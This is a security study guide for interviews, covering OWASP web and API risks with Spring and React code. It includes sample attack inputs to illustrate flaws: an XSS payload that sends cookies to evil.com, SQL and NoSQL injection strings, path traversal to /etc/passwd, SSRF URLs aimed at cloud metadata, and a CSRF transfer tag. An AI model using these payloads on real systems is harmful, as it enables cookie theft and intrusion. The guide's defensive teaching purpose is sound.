# Security — Frontend & Backend

Reference for Staff-level security discussions. Anchored on the **OWASP Top 10 (2021)** and
**OWASP API Security Top 10 (2023)**, with concrete examples in Spring Boot (WebFlux) and React.

---

## The attacker's mindset (why this matters at Staff level)

Security is not a feature sprint. It is a cross-cutting concern that must be designed in from
the start. At Staff level you are expected to:
- Spot vulnerabilities in code review without a checklist.
- Design threat models for new systems ("what are the trust boundaries?").
- Choose between security trade-offs (usability vs. defence-in-depth).
- Know which layer owns which control (network, API gateway, application, DB).

---

## OWASP Top 10 (2021) — web applications

### A01: Broken Access Control

The most prevalent category. Users act outside their intended permissions.

**Patterns:**
- IDOR (Insecure Direct Object Reference): `GET /api/invoices/1234` — does the server verify the caller *owns* invoice 1234?
- Missing function-level access control: `/api/admin/users` returns 200 for non-admins.
- Path traversal: `GET /files?name=../../etc/passwd`.

**Fix — backend (Spring WebFlux):**
```java
// lld/auth/RbacService.java pattern — check ownership at the service layer, not the controller
public Mono<Article> getArticle(Long id, AuthUser caller) {
    return articleRepo.findById(id)
        .filter(a -> a.authorId().equals(caller.id()) || caller.hasRole(Role.ADMIN))
        .switchIfEmpty(Mono.error(new ResponseStatusException(FORBIDDEN)));
}
// Never: return articleRepo.findById(id); // trusting the client-provided ID blindly
```

**Fix — frontend:**
- Never hide UI elements as the only access control — a determined user can call the API directly.
- Strip role checks from the frontend for sensitive data; enforce on the server.

---

### A02: Cryptographic Failures (formerly "Sensitive Data Exposure")

Sensitive data exposed in transit or at rest due to weak or missing encryption.

**Common mistakes:**
- Storing passwords in plaintext or with MD5/SHA-1 (use bcrypt/Argon2).
- HTTP (not HTTPS) — trivially intercepted.
- JWT `alg: none` — signature bypass.
- Weak JWT secrets (`secret`, `password`) — brute-forceable offline.
- Logging sensitive fields (PII, tokens, payment card numbers).

**Fix — Spring Boot:**
```java
// lld/auth/TokenService.java — enforce secret strength at startup (fail-fast)
if (secret.length() < 32) throw new IllegalStateException("JWT secret min 32 chars");

// lld/security/KeyDerivationService.java — use PBKDF2/bcrypt for passwords
// Never: MessageDigest.getInstance("MD5").digest(password.getBytes())
```

```yaml
# application.yaml — never log sensitive headers/bodies in prod
logging:
  level:
    org.springframework.web: WARN  # not DEBUG (would log request bodies)
```

**Fix — frontend:**
```typescript
// Never store tokens in localStorage if XSS is a risk (see A03).
// Use HttpOnly, Secure, SameSite=Strict cookies — inaccessible to JS.
// If you must use localStorage, understand that any XSS = full token theft.
```

---

### A03: Injection (SQL, NoSQL, Command, LDAP)

Untrusted data sent to an interpreter as part of a command or query.

**SQL injection:**
```java
// ❌ String concatenation — classic SQLi
String query = "SELECT * FROM users WHERE email = '" + email + "'";
// email = "' OR '1'='1" → returns all users

// ✅ R2DBC parameterised query (also safe from SQLi)
@Query("SELECT * FROM articles WHERE author = :author ORDER BY created_at DESC")
Flux<Article> findRecentByAuthor(String author);
// Spring Data R2DBC always uses prepared statements — :param bindings are never interpolated
```

**NoSQL injection (MongoDB):**
```java
// ❌ Building a raw query from user input
Document query = Document.parse("{ name: '" + userInput + "' }");
// userInput = "', $where: 'sleep(10000)'" → MongoDB operator injection

// ✅ Spring Data MongoDB derived queries — parameters are always bound
Flux<Note> findByAuthor(String author);   // safe — Spring Data handles binding
```

**Command injection:**
```java
// ❌ Never pass user input to Runtime.exec() or ProcessBuilder as a string
Runtime.getRuntime().exec("convert " + userInput + " output.png");

// ✅ Use ProcessBuilder with an array — OS does not interpret the string
new ProcessBuilder("convert", sanitizedFilename, "output.png").start();
```

**Frontend — template injection:**
```tsx
// ❌ dangerouslySetInnerHTML with user content
<div dangerouslySetInnerHTML={{ __html: userPost.content }} />

// ✅ React escapes by default — text content is always safe
<div>{userPost.content}</div>

// If you MUST render HTML (rich text), use DOMPurify to sanitise first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userPost.content) }} />
```

---

### A04: Insecure Design

Architecture-level failures — no threat model, missing rate limits, unbounded operations.

**Examples:**
- No rate limiting on login endpoint → brute-force attack.
- Password reset sends the new password via email → plaintext secret in transit.
- Bulk export endpoint returns all records, no pagination limit → data exfiltration.
- Multi-tenant SaaS: missing tenant ID in every query → tenant A sees tenant B's data.

**Fix — design checklist for new APIs:**
1. What are the trust boundaries? (Who calls this? From where?)
2. What is the blast radius if this endpoint is abused?
3. Does every query include a tenant/owner scope?
4. What is the rate limit? What is the max page size?

---

### A05: Security Misconfiguration

Secure defaults disabled, unnecessary features enabled, verbose error messages.

**Spring Boot misconfigurations to avoid:**
```yaml
# ❌ Exposing all actuator endpoints publicly
management.endpoints.web.exposure.include: "*"

# ✅ Only expose what you need
management.endpoints.web.exposure.include: health,info,prometheus

# ❌ Showing full stack traces to the client
server.error.include-stacktrace: always

# ✅ Never in production
server.error.include-stacktrace: never
server.error.include-message: never
```

```java
// ❌ Spring Security (if added) with CSRF disabled globally
http.csrf(csrf -> csrf.disable());  // only acceptable for stateless JWT APIs

// ✅ CORS — whitelist, never open
CorsConfiguration config = new CorsConfiguration();
config.setAllowedOrigins(List.of("https://app.example.com"));  // not "*"
config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
```

**Frontend misconfigurations:**
```html
<!-- ❌ No Content-Security-Policy → XSS can exfiltrate any data -->
<!-- ✅ Add via HTTP headers (preferred) or meta tag -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; object-src 'none';" />
```

```typescript
// Vite — set security headers in vite.config.ts (dev) or nginx/CDN config (prod)
server: {
  headers: {
    'X-Frame-Options': 'DENY',              // clickjacking
    'X-Content-Type-Options': 'nosniff',   // MIME sniffing
    'Referrer-Policy': 'strict-origin',
  }
}
```

---

### A06: Vulnerable and Outdated Components

Dependencies with known CVEs — the most mechanical to fix, but often neglected.

**Detection:**
```bash
# npm — built into npm (runs in ci-security.yml)
npm audit --audit-level=high

# Java — OWASP Dependency-Check Maven plugin (runs in ci-security.yml)
./mvnw org.owasp:dependency-check-maven:check -DfailBuildOnCVSS=8

# Python — pip-audit (runs in ci-security.yml)
uv run pip-audit
```

**Fix:**
- Pin major versions, keep patch versions floating (`^3.12.0` not `3.12.0`).
- Renovate or Dependabot PRs with auto-merge for patch bumps that pass CI.
- Set a CVE SLA: Critical → patch within 24h, High → 7 days, Medium → 30 days.

---

### A07: Identification and Authentication Failures

Weak or missing auth — no MFA, weak passwords, predictable session IDs, improper logout.

**JWT pitfalls:**
```java
// ❌ Not validating expiry
Jwts.parserBuilder().setSigningKey(key).build().parseClaimsJws(token);
// → doesn't throw if expired unless you check claims.getExpiration()

// ✅ Validate expiry, algorithm, issuer, audience explicitly
Claims claims = Jwts.parserBuilder()
    .setSigningKey(key)
    .requireIssuer("backend-service")
    .build()
    .parseClaimsJws(token)
    .getBody();
if (claims.getExpiration().before(new Date())) throw new TokenExpiredException();

// ❌ alg: none bypass — always specify the expected algorithm
// ✅ Use RS256 (asymmetric) for services that only verify, not issue
```

**Session management — frontend:**
```typescript
// ❌ Logout by deleting localStorage token only
localStorage.removeItem('token');
// → token is still valid on the server; if stolen before logout, attacker wins

// ✅ Logout = call server to revoke/blacklist the token + clear client storage
await api.post('/auth/logout');   // server invalidates session/token
localStorage.clear();
```

---

### A08: Software and Data Integrity Failures

Unsigned updates, unsafe deserialization, CI/CD pipeline attacks.

**In CI/CD:**
- Pin action versions by SHA, not tag: `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` not `@v4` (a tag can be moved).
- Never allow `pull_request_target` triggers to run untrusted code with secrets access.
- Rotate `GITHUB_TOKEN` scope to minimum: use `permissions: contents: read` where possible.

**Serialization:**
```java
// ❌ Java object deserialization of untrusted data
ObjectInputStream ois = new ObjectInputStream(userSuppliedStream);
// → Remote Code Execution if a gadget chain exists in the classpath

// ✅ Use JSON (Jackson) — no gadget chains, explicit schema
// ✅ If you must deserialize binary, validate class allowlist first
```

---

### A09: Security Logging and Monitoring Failures

Silent failures — attackers go undetected because there's nothing to alert on.

**What to log (structured JSON via ECS — already wired in this repo):**
- Authentication: login success/failure (with IP, user-agent), token issuance, revocation.
- Authorization: access denied events (who tried to access what).
- Mutations: create/update/delete of sensitive resources.
- Errors: 4xx (potential probing), 5xx (operational issues).

**What NOT to log:**
- Passwords, tokens, secrets (even partially).
- PII (full email, SSN, credit card numbers) — hash or truncate.
- Full request bodies on auth endpoints.

```java
// Spring Boot with ECS structured logging (already in application.yaml)
// Every log line is JSON with @timestamp, log.level, service.name, etc.
// Feed to Elasticsearch → Kibana → set alert: >5 auth failures from same IP in 60s
log.warn("auth.failure user={} ip={} reason={}", userId, ip, reason);
```

---

### A10: Server-Side Request Forgery (SSRF)

Server fetches a user-supplied URL, allowing access to internal services.

```java
// ❌ Fetching a user-supplied URL from the server
String url = request.getParam("webhookUrl");
WebClient.create().get().uri(url).retrieve().bodyToMono(String.class);
// → attacker supplies http://169.254.169.254/latest/meta-data/ (AWS IMDS)
// → attacker supplies http://localhost:8080/actuator/env (internal service)

// ✅ Validate against an allowlist of permitted hosts
URI uri = URI.create(url);
if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new BadRequestException("host not allowed");
```

---

## OWASP API Security Top 10 (2023)

| # | Name | Key fix |
|---|---|---|
| API1 | Broken Object Level Auth | Verify ownership on every object access, not just auth |
| API2 | Broken Auth | Use short-lived tokens, rotate secrets, enforce MFA |
| API3 | Broken Object Property Level Auth | Return only fields the caller is allowed to see; use DTOs not entities |
| API4 | Unrestricted Resource Consumption | Rate limit + paginate + max request size |
| API5 | Broken Function Level Auth | Separate admin vs user endpoints; don't rely on obscurity |
| API6 | Unrestricted Access to Sensitive Business Flows | CAPTCHA / device fingerprint on account creation, checkout |
| API7 | SSRF | Allowlist outbound URLs; block RFC-1918 and metadata ranges |
| API8 | Security Misconfiguration | Disable unused verbs, strip server headers, no stack traces |
| API9 | Improper Inventory Management | Deprecate old API versions; don't leave `/v1` up when `/v3` is live |
| API10 | Unsafe Consumption of APIs | Validate and sanitize all data from third-party APIs |

---

## Frontend-specific vulnerabilities

### XSS (Cross-Site Scripting)

Three types:
- **Stored XSS**: malicious script saved in the database, rendered to all users.
- **Reflected XSS**: script in the URL, reflected back in the response.
- **DOM-based XSS**: client-side JS writes untrusted data to the DOM.

```tsx
// ❌ Reflected XSS via URL param
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello ${name}!`;
// URL: /page?name=<script>fetch('https://evil.com/?c='+document.cookie)</script>

// ✅ React text content is escaped by default
const [name] = useState(new URLSearchParams(location.search).get('name') ?? '');
return <p>Hello {name}!</p>;  // safe — React escapes the string

// ✅ For rich text: DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(untrustedHtml, { ALLOWED_TAGS: ['b', 'i', 'em'] });
return <div dangerouslySetInnerHTML={{ __html: clean }} />;
```

### CSRF (Cross-Site Request Forgery)

A malicious site causes the victim's browser to make an authenticated request to your site.

```
Victim is logged in to bank.com
Evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
→ browser sends the request with the victim's cookies
```

**Fixes:**
- `SameSite=Strict` cookies — browser won't send the cookie cross-site.
- CSRF token in a custom request header (e.g. `X-CSRF-Token`) — readable by JS only if same-origin.
- Stateless JWT in `Authorization` header — not automatically sent by the browser, so CSRF is not a threat.

```typescript
// For cookie-based sessions, add the CSRF token header on every mutating request
axios.defaults.headers.common['X-CSRF-Token'] = getCsrfTokenFromCookie();
```

### Clickjacking

Your page embedded in a hidden iframe on an attacker's site; user unknowingly clicks your buttons.

```
# Fix: HTTP response header (nginx, CDN, or application)
X-Frame-Options: DENY
# Or CSP (more flexible):
Content-Security-Policy: frame-ancestors 'none';
```

### Open Redirect

```typescript
// ❌ Redirecting to a user-supplied URL
const redirect = searchParams.get('next');
router.push(redirect);  // attacker supplies https://phishing.com/login

// ✅ Validate that the redirect is relative or on your own domain
const url = new URL(redirect, window.location.origin);
if (url.origin !== window.location.origin) throw new Error('Invalid redirect');
router.push(url.pathname);
```

### localStorage vs HttpOnly cookies

| | `localStorage` | HttpOnly cookie |
|---|---|---|
| XSS access | Yes — `document.cookie` | No — inaccessible to JS |
| CSRF risk | No — not auto-sent by browser | Yes — must add SameSite |
| Mobile apps | Easiest for React Native | Harder |
| Recommendation | Avoid for auth tokens if XSS possible | Preferred for web sessions |

---

## Secrets management

**Never:**
```bash
# ❌ Hardcoded secret in code — will appear in git history forever
JWT_SECRET=supersecret123

# ❌ Secret in .env committed to git
echo "DB_PASSWORD=prod-password" >> .env && git add .env
```

**In CI/CD (GitHub Actions):**
```yaml
# Store secrets in GitHub Settings → Secrets and variables → Actions
env:
  JWT_SECRET: ${{ secrets.JWT_SECRET }}       # injected at runtime, never logged
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
```

**In production:**
- AWS Secrets Manager / GCP Secret Manager / HashiCorp Vault.
- Inject as environment variables at container startup, not baked into the image.
- Rotate secrets regularly; invalidate old ones.

**In Spring Boot:**
```yaml
# application.yaml — reference env vars, never hardcode
spring:
  r2dbc:
    url: ${DB_URL}
    username: ${DB_USER}
    password: ${DB_PASSWORD}
```

---

## Security headers cheat sheet

| Header | Value | Protects against |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'` | XSS, data exfiltration |
| `X-Frame-Options` | `DENY` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-type sniffing |
| `Referrer-Policy` | `strict-origin` | Referrer leakage |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Protocol downgrade, MITM |
| `Permissions-Policy` | `camera=(), microphone=()` | Feature abuse |
| `Cross-Origin-Resource-Policy` | `same-origin` | Spectre attacks |

Add in Spring Boot WebFlux:
```java
@Bean
WebFilter securityHeadersFilter() {
    return (exchange, chain) -> {
        HttpHeaders headers = exchange.getResponse().getHeaders();
        headers.add("X-Content-Type-Options", "nosniff");
        headers.add("X-Frame-Options", "DENY");
        headers.add("Referrer-Policy", "strict-origin");
        return chain.filter(exchange);
    };
}
```

---

## CI/CD security pipeline (this repo)

Four workflows in `.github/workflows/`:

| Workflow | When | What it checks |
|---|---|---|
| `ci-java.yml` | PR / push | Build + unit tests (no infra); integration tests on `main` with Docker services |
| `ci-python.yml` | PR / push | pytest + Ruff lint for agentic-python + mcp-server-py |
| `ci-web.yml` | PR / push | tsc --noEmit, Vitest, Vite build per app |
| `ci-security.yml` | PR to main + weekly | npm audit, pip-audit, OWASP dep-check (Java), Gitleaks secret scan, CodeQL SAST |

**Security gates:**
- `npm audit --audit-level=high` fails the build on high/critical CVEs.
- `OWASP dependency-check -DfailBuildOnCVSS=8` fails on CVSS ≥ 8 Java deps.
- Gitleaks blocks PRs with committed secrets.
- CodeQL reports findings to the Security tab (does not block builds by default — configure a required check to enforce).

---

## Threat modelling (STRIDE)

Use STRIDE when designing any new system component:

| Threat | Description | Example | Mitigation |
|---|---|---|---|
| **S**poofing | Impersonating another user/service | Forged JWT | Verify signature + issuer + audience |
| **T**ampering | Modifying data in transit or at rest | MITM changing request body | HTTPS, request signing (HMAC) |
| **R**epudiation | Denying an action was taken | "I never transferred that money" | Audit log + non-repudiation signature |
| **I**nformation disclosure | Exposing data to unauthorised parties | Stack trace in error response | Generic error messages, proper ACL |
| **D**enial of service | Making the service unavailable | Flooding the login endpoint | Rate limiting, circuit breaker, WAF |
| **E**levation of privilege | Gaining higher permissions | Horizontal privilege escalation | RBAC enforced server-side |

---

## Interview talking points

1. **Defence in depth**: no single control is enough. Layer authentication (API gateway), authorisation (service layer), input validation (controller), output encoding (template), and network controls (firewall, VPC). Each layer catches what the previous missed.

2. **Least privilege**: every service account, IAM role, and DB user should have only the permissions it needs for the job it does. Blast radius = permissions × data it can reach.

3. **Shift-left security**: catching a vulnerability in code review costs 10×–100× less than in production. SAST (CodeQL, Semgrep) + SCA (OWASP, npm audit) in CI are the mechanism.

4. **Zero trust**: don't trust because you're inside the VPC. Every service-to-service call authenticates (mTLS or signed JWTs). Every request is authorised explicitly. Assume the network is compromised.

5. **XSS vs CSRF**: XSS = injecting code into your page; fix = output encoding, CSP. CSRF = browser auto-sends your credentials to a malicious third-party request; fix = SameSite cookies, CSRF token. They are distinct: CSRF exploits the browser's credential-sending behaviour; XSS exploits the page's trust in content.

6. **JWT vs session cookies**: JWT is stateless (server holds no state, scales horizontally, instant multi-region) but token revocation requires a blocklist (killing the stateless advantage). Session cookies + Redis store are stateful but revocable instantly. Pick based on your revocation requirements.
